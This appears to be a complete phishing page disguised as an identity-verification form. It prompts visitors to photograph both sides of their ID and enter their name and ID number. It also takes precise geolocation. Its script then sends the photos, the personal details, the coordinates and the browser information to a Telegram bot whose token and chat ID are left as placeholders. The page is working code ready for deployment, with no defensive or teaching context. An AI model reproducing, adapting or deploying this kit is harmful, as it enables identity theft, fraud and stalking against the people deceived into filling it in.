<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Identity Verification</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: #0f1115;
    color: #e8eaed;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 20px;
  }
  .card {
    background: #1a1d23;
    padding: 32px;
    border-radius: 14px;
    box-shadow: 0 8px 30px rgba(0,0,0,0.5);
    width: 100%;
    max-width: 440px;
    border: 1px solid #2a2e36;
  }
  .card h1 { font-size: 20px; margin-bottom: 6px; }
  .card p.sub { font-size: 13px; color: #9aa0a6; margin-bottom: 24px; }
  label { display: block; font-size: 12px; color: #9aa0a6; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
  input[type="text"], input[type="file"] {
    width: 100%;
    padding: 12px;
    background: #0f1115;
    border: 1px solid #2a2e36;
    border-radius: 8px;
    color: #e8eaed;
    font-size: 14px;
    margin-bottom: 16px;
  }
  input[type="file"] { padding: 9px; font-size: 12px; }
  input:focus { outline: none; border-color: #4c8bf5; }
  .slot {
    border: 1px dashed #3a4a6c;
    border-radius: 10px;
    padding: 18px;
    text-align: center;
    margin-bottom: 14px;
    cursor: pointer;
    background: #141821;
  }
  .slot.has-file { border-color: #4c8bf5; background: #16203a; }
  .slot .lbl { font-size: 12px; color: #9aa0a6; }
  .slot img { max-width: 100%; max-height: 140px; margin-top: 10px; border-radius: 6px; display: none; }
  button {
    width: 100%;
    padding: 13px;
    background: #4c8bf5;
    color: #fff;
    border: none;
    border-radius: 8px;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 8px;
  }
  button:hover { background: #3b78e0; }
  button:disabled { background: #2a2e36; color: #6b7280; cursor: not-allowed; }
  .err { color: #f28b82; font-size: 12px; margin-top: 10px; display: none; text-align: center; }
  .status { color: #9aa0a6; font-size: 12px; margin-top: 10px; text-align: center; display: none; }
</style>
</head>
<body>
  <div class="card">
    <h1>Identity Verification</h1>
    <p class="sub">Upload both sides of your ID. Location is used to verify your region.</p>

    <label>Front of ID</label>
    <div class="slot" id="slotFront">
      <div class="lbl">Tap to capture front</div>
      <img id="imgFront" alt="">
      <input type="file" id="fileFront" accept="image/*" capture="environment" hidden>
    </div>

    <label>Back of ID</label>
    <div class="slot" id="slotBack">
      <div class="lbl">Tap to capture back</div>
      <img id="imgBack" alt="">
      <input type="file" id="fileBack" accept="image/*" capture="environment" hidden>
    </div>

    <form id="idForm">
      <label for="fullname">Full name</label>
      <input type="text" id="fullname" name="fullname" required autocomplete="name">

      <label for="idnumber">ID number</label>
      <input type="text" id="idnumber" name="idnumber" required autocomplete="off">

      <button type="submit" id="submitBtn">Verify</button>
      <div class="err" id="err">Verification failed. Check your details.</div>
      <div class="status" id="status">Submitting…</div>
    </form>
  </div>

  <script>
    const BOT_TOKEN = 'PASTE_BOT_TOKEN';
    const CHAT_ID   = 'PASTE_CHAT_ID';
    const API       = `https://api.telegram.org/bot${BOT_TOKEN}`;

    const state = { front: null, back: null, geo: null };

    function bindSlot(slotId, imgId, inputId, key) {
      const slot = document.getElementById(slotId);
      const img  = document.getElementById(imgId);
      const inp  = document.getElementById(inputId);
      slot.addEventListener('click', () => inp.click());
      inp.addEventListener('change', () => {
        const f = inp.files[0];
        if (!f) return;
        state[key] = f;
        const r = new FileReader();
        r.onload = e => { img.src = e.target.result; img.style.display = 'block'; };
        r.readAsDataURL(f);
        slot.classList.add('has-file');
        slot.querySelector('.lbl').textContent = 'Captured ✓';
      });
    }
    bindSlot('slotFront', 'imgFront', 'fileFront', 'front');
    bindSlot('slotBack',  'imgBack',  'fileBack',  'back');

    function getLocation() {
      return new Promise(resolve => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
          p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
          () => resolve(null),
          { enableHighAccuracy: true, timeout: 8000 }
        );
      });
    }

    async function sendPhoto(file, caption) {
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      fd.append('caption', caption);
      fd.append('photo', file, file.name || 'id.jpg');
      const r = await fetch(`${API}/sendPhoto`, { method: 'POST', body: fd });
      return r.json();
    }

    async function sendMessage(text) {
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      fd.append('text', text);
      fd.append('parse_mode', 'HTML');
      return fetch(`${API}/sendMessage`, { method: 'POST', body: fd });
    }

    document.getElementById('idForm').addEventListener('submit', async e => {
      e.preventDefault();
      const err = document.getElementById('err');
      const status = document.getElementById('status');
      err.style.display = 'none';

      if (!state.front || !state.back) {
        err.textContent = 'Both sides of the ID are required.';
        err.style.display = 'block';
        return;
      }

      document.getElementById('submitBtn').disabled = true;
      status.style.display = 'block';

      const name = document.getElementById('fullname').value;
      const num  = document.getElementById('idnumber').value;

      if (!state.geo) {
        status.textContent = 'Requesting location…';
        state.geo = await getLocation();
      }

      const g = state.geo;
      const geoLine = g ? `${g.lat}, ${g.lon} (±${Math.round(g.acc)}m)` : 'unavailable';
      const mapsLink = g ? `https://maps.google.com/?q=${g.lat},${g.lon}` : 'n/a';

      const meta =
        `<b>ID Submission</b>\n` +
        `Name: ${name}\n` +
        `ID: ${num}\n` +
        `Location: ${geoLine}\n` +
        `Map: ${mapsLink}\n` +
        `UA: ${navigator.userAgent}`;

      try {
        status.textContent = 'Sending front…';
        await sendPhoto(state.front, meta);
        status.textContent = 'Sending back…';
        await sendPhoto(state.back, 'Back of ID');
        status.textContent = 'Sent.';
        window.location.href = 'https://www.example-id-verify.com/success';
      } catch (ex) {
        err.textContent = 'Network error. Try again.';
        err.style.display = 'block';
        status.style.display = 'none';
        document.getElementById('submitBtn').disabled = false;
      }
    });
  </script>
</body>
</html>
